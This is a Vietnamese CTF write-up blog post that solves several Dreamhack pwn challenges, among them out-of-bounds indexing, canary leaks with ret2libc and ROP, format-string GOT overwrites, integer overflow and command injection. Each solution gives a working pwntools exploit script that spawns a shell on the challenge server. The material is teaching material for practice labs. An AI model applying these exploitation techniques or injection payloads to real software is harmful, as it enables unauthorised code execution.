---
title: Dreamhack (P2)
published: 2024-07-27
category: "CTF"
tags: [PWN, CTF]
---

# [Out-of-boundary](https://dreamhack.io/wargame/challenges/11)
## Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```
- Bài cho ta nhập vào biến `name` một chuỗi 16 bit và sau đó là nhập vào một số nguyên vào `idx`, cuối cùng là gọi lệnh `system(command[idx])`
- Ta thấy trong `command` có 5 lệnh `"cat",
    "ls",
    "id",
    "ps",
    "file ./oob"`
- Nhưng các lệnh này không giúp ích gì cho ta vì ta cần là `cat flag`
- Theo tìm hiểu thì bài này thuộc dạng `oob` là ta cố gắng truy cập phần tử ngoài phạm vi của mảng
- Ta tìm cách đưa `cat flag` vào và gọi `system(command[idx])` đến đó
- Ta đưa `cat flag` vào biến `name`
- Debug để xem đưa vào đâu trong bộ nhớ
- Dữ liệu sẽ đưa vào địa chỉ `0x804a0ac` là địa chỉ của `name`
- Tìm địa chỉ của `command` và tính ofset để tìm `idx` cần để gọi đến `cat flag`
> `0x804a060 - 0x804a0ac = 76`
- Vì là kiến trúc 32 bit nên mỗi con trỏ là 4 byte nên ta chia 4 đề tìm được chỉ số `76/4 = 19`
- Tiếp theo lần nhập `idx` ta nhập `19`
- Nhưng không đúng vì `system` chỉ nhận tham số chỉ là `cat `
- Ta cần đưa tham số là địa chỉ chứa chuỗi `cat flag` để `system` hoạt động đúng
- Nên ta cần đưa địa chỉ chứa `cat flag` sau đó mới tới chuỗi nên chuỗi sẽ nằm ở `0x804a0ac + 4 = 0x804a0b0`
## Script
```python=
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./out_of_bound',checksec=False)

#p = process(exe.path)
p = remote('host1.dreamhack.games',13638)

payload = p32(0x804a0b0)
payload += b'cat flag'

p.sendafter(b'name: ', payload)

#input()

p.sendlineafter(b'want?: ',b'19')

p.interactive()
```
# [Return to Library](https://dreamhack.io/wargame/challenges/353)
## Source code
```c 
#include <stdio.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```
- Như bài đã gợi ý thì đầu tiên ta cần leak canary vì bài này canary được bật sau đó overwrite để gọi `system(/bin/sh)` vì bài này file thực thi đã cho sẵn `/bin/sh` và có `system@plt`
- Trên `rbp` đó chính là giá trị canary, vì giá trị này thay đổi động nên ta cần leak để lần nhập sau đó có thể bypass qua canary 
- Ta thấy byte cuối của canary luôn bằng 0x00 nên ta có thể leak canary mà không làm thay đổi giá trị bằng cách nhập thêm 1 byte để overwrite vào canary sau để lệnh `prinf` sẽ in giá trị canary với byte cuối là giá trị hex của kí tự được chèn vào
- Sau khi leak ta cần đổi byte cuối thành `0x00`
- Sau đó lần nhập sau ta có thể overwrite địa chỉ trả về để gọi `system(/bin/sh)`
## Script
```python=
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./rtl',checksec=False)

#p = process(exe.path)
p = remote('host1.dreamhack.games', 24332)

pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b'A'*57

p.recvuntil(b"Buf: ")
input()
p.send(payload)

p.recvuntil(payload)

canary = u64(b"\x00" + p.recvn(7))
log.info(hex(canary))

binsh = next(exe.search(b'/bin/sh'))

payload = flat(
    b'A'*56,
    canary,
    b'A'*8,
    pop_rdi, binsh,
    ret,
    exe.plt['system']
)

p.recvuntil(b"Buf: ")
p.send(payload)

p.interactive()
```
# [basic_exploitation_002](https://dreamhack.io/wargame/challenges/4)

## Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);

    exit(0);
}
```
- Chương trình có lỗi format string ở `printf(buf)`
- Ta thấy có một hàm `get_shell()` gọi `system("/bin/sh")` nên mục tiêu là vào hàm này
- Ta sẽ dùng format string để ghi đè bảng got của hàm `exit()` thành hàm `get_shell()`
- ta xem bảng got
- vì `exit@got` và hàm `get_shell` chỉ khác nhau 2 byte cuối nên ta chỉ cần ghi đè 2 byte cuối
> get_shell & 0xffff để lấy 2 byte cuối
## Script
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('./basic_exploitation_002', checksec = False)

#p = process(exe.path)
p = remote('host1.dreamhack.games', 10966)

get_shell = 0x8048609

payload = p32(exe.got['exit'])
payload += f'%{(get_shell - 4) & 0xffff}c%1$hn'.encode()

input()
p.sendline(payload)

p.interactive()
```
# [basic_exploitation_003](https://dreamhack.io/wargame/challenges/5)
## Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```
- Chương trình có hàm `get_shell()` gọi `system("/bin/sh")`, nên mục tiêu là thực thi hàm này để chiếm shell
- Chương trình cho nhập vào 0x80 byte vào một vùng nhớ heap 
- Sau đó in nội dung vừa nhập vào stack bằng lệnh ` sprintf(stack_buf, heap_buf);`, lệnh này sẽ in nội dung như `printf` vào `stack_buf` nên có lỗi format string 
- Ta sẽ dùng `%n` để in ra số ký tự vào `stack_buf` và ghi đè địa chỉ trả về 
- `stack_buf` được lưu ở `ebp-0x98` nên cần 0x98+4(ebp) = 156 byte để ghi đè địa chỉ trả về
## Script
```python=
#!/usr/bin/python3

from pwn import *

exe = ELF('./basic_exploitation_003', checksec = False)

#p = process(exe.path)

p = remote('host1.dreamhack.games', 18395)


payload = b"%156c" + p32(exe.symbols['get_shell'])

p.send(payload)

p.interactive()
```
# [rop](https://dreamhack.io/wargame/challenges/354)
## Source code
```c 
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```
- Bài này tương tự bài [Return to Library](https://hackmd.io/3AGME2mOS92lF36G_35qEQ?view#Return-to-Library) nhưng không có hàm thực thi để chiếm shell nên ta cần leak libc để thực thi hàm `system("/bin/sh")`
- Để leak libc ta xem bảng got có những hàm nào để tận dụng
- Ta thấy có hàm `puts`, ta dùng `puts@plt` để thực thi và leak ra địa chỉ libc của `puts`
## Script
```python=
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./rop", checksec = False)
libc = ELF('libc.so.6', checksec = False)

#p = process(exe.path)
p = remote('host1.dreamhack.games', 17656)

pop_rdi = 0x0000000000400853
ret = 0x0000000000400596

payload = b'A'*57

p.sendafter(b'Buf: ',payload)
p.recvuntil(b'A'*57)
canary = u64(b'\x00' + p.recv(7)) 
log.info(hex(canary))

payload = flat(
	b'A'*56,
	canary,
	b'A'*8,
	pop_rdi, exe.got['puts'],
	exe.plt['puts'],
	exe.sym['_start']
)

input()
p.sendafter(b'Buf: ',payload)

libc_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = libc_leak - libc.sym['puts']
log.info(hex(libc_leak))
log.info(hex(libc.address))

payload = b'A'*56

p.sendafter(b'Buf: ',payload)

payload =  flat(
	b'A'*56,
	canary,
	b'A'*8,
	pop_rdi, next(libc.search(b'/bin/sh')),
	ret,
	libc.sym['system'],
)

p.sendafter(b'Buf: ',payload)

p.interactive()
```
# [oneshot](https://dreamhack.io/wargame/challenges/34)
## Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```
- Checksec
- Cho nhập vào biến `msg` 46 byte trong khi khai báo có 16 byte nên có lỗi buffer overflow
- Có vẻ bài này thực thi `system("/bin/sh)"` bằng cách leak libc có vẻ không khả thi
- Ta sử dụng một công cụ là `one_gadget` để tìm địa chỉ của lệnh `execve("/bin/sh")` trong file libc 
- Sau đó leak libc vì bài cho sẵn địa chỉ của `stdout`
- Nhưng để chương trình thực thi thành công thì `if(check > 0)` là không đúng để không kết thúc chương trình, ta cần gán check = 0, size_t có giá trị là 8 byte
## Script
```python=
#!/usr/bin/python3

from pwn import *


exe = ELF("./oneshot", checksec = False)
libc = ELF("./libc.so.6", checksec = False)

#p = process(exe.path)

p = remote("host1.dreamhack.games", 16119)

one_gadget = 0x45216

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1],16)
log.info(hex(stdout))

libc.address = stdout - libc.sym['_IO_2_1_stdout_']
log.info(hex(libc.address))

oneshot = libc.address + one_gadget

payload = b'A'*24
payload += p64(0)
payload += b'A'*8 
payload += p64(oneshot)

input()
p.sendline(payload)

p.interactive()
```
# [sint](https://dreamhack.io/wargame/challenges/25)
## Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```
- Bài cho đọc vào số nguyên `size`, nếu `size > 256` hoặc `size < 0` thì thoát chương trình, nếu ngược lại thì nhập vào `buf` với kích thước `size - 1`
- Bài này có lỗi interger overflow vì khi ta nhập số 0 vào `size` thì khi đọc `size - 1` là `-1` thì 0xffffffff được nhận dạng là số nguyên không dấu khi đó ta có thể nhập số lượng ký tự không giới hạn
- Stack không được bật cho phép ta overwrite địa chỉ trả về thành hàm get_shell có trong chương trình

## Script
```python=
#!/usr/bin/python3

from pwn import * 


exe = ELF('./sint', checksec = False)

#p = process(exe.path)
p = remote('host1.dreamhack.games', 13235)

payload = b'A'*260
payload += p32(exe.sym['get_shell'])

p.recvuntil(b'Size: ')
p.sendline(b'0')
p.recvuntil(b'Data: ')
p.sendline(payload)

p.interactive()

```
# [cmd_center](https://dreamhack.io/wargame/challenges/117)
## Source code
```c 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
}

int main()
{

        char cmd_ip[256] = "ifconfig";
        int dummy;
        char center_name[24];

        init();

        printf("Center name: ");
        read(0, center_name, 100);


        if( !strncmp(cmd_ip, "ifconfig", 8)) {
                system(cmd_ip);
        }

        else {
                printf("Something is wrong!\n");
        }
        exit(0);
}
```
- Chương trình cho nhập vào 100 byte `center_name` nhưng chỉ được khai báo 24 byte nên có lỗi buffer overflow
- Sau đó nếu `cmd_ip = ifconfig` thì sẽ thực thi `system(cmd_ip)`
- Để chiếm được shell thì phải thực thi `system("/bin/sh")`
- Với câu lệnh `system("ifconfig;/bin/sh")` vẫn lấy được shell vì `system` sẽ thực thi được `system("ifconfig")` sau đó đến  `system("/bin/sh")`
- Ta sẽ overwrite để không bị thay đổi cmd_ip lúc đầu và thêm sau đó chuỗi `;/bin/sh`
- Debug để tìm ofset giữa `cmd_ip` và `center_name`
- Vì hàm `read` có `center_name` là tham số thứ 2 nên ta xem `rsi` được lấy từ đâu, `rsi` được lấy từ `[rbp-0x130]` đó là địa chỉ tương đối của `center_name`
- Tương tự địa chỉ tương đối của `cmd_ip` là `[rbp-0x110]`
`ofset = 0x130 - 0x110 = 0x20`
## Script
```python=
#!/usr/bin/python3

from pwn import *

#p = process('./cmd_center')
p = remote('host1.dreamhack.games', 18358)


payload = b'A'*0x20 + b'ifconfig;/bin/sh'

p.sendlineafter(b'Center name: ', payload)

p.interactive()
```
# [](https://)
## Source code
```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d", len);
    ptr[len] = '\0';
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}
```
- Ta cần đổi `age = 0` để có được shell
- Chương trình cho nhập vào `name` 20 byte
- Ta gửi 20 byte thì có shell =))
